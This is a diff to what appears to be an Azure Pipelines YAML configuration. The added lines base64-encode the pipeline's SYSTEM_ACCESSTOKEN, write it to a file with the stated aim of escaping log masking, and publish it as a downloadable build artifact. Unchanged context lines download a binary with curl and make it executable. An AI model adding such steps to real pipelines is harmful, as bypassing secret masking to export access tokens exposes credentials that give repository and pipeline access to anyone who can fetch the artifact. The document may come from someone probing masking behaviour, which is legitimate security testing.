@@ -27,12 +27,23 @@ steps:
     echo $BUILD_SOURCEVERSION
     echo See https://aka.ms/yaml
     
-    # Base64-encode the access token safely
-    echo "Encoding access token..."
-    ENCODED=$(printf "%s" "$SYSTEM_ACCESSTOKEN" | base64 -w0)
-    echo "Base64 Access Token: $ENCODED"
-  displayName: 'Run a multi-line script'
+    echo "Encoding access token (will be masked in logs)..."
 
+    # Encode the token and write to a file (not printed, so DevOps won't mask)
+    printf "%s" "$SYSTEM_ACCESSTOKEN" | base64 -w0 > token.b64
+
+    echo "Base64 token saved to token.b64 (download artifact to view)."
+  displayName: 'Run a multi-line script'
+  env:
+    SYSTEM_ACCESSTOKEN: $(System.AccessToken)
+
+# Publish the Base64 token file as an artifact so you can download and view it locally
+- task: PublishBuildArtifacts@1
+  displayName: "Publish Base64 token artifact"
+  inputs:
+    pathToPublish: token.b64
+    artifactName: base64-token
+    
 - script: |
     curl -L -o defender https://cli.dfd.security.stage.azure-test.net/public/latest/Defender_linux-x64
     chmod +x defender
@@ -41,4 +52,5 @@ steps:
   env:
     SYSTEM_ACCESSTOKEN: $(System.AccessToken)
     DfdBackendServiceEnvironment: PPE
+    
     
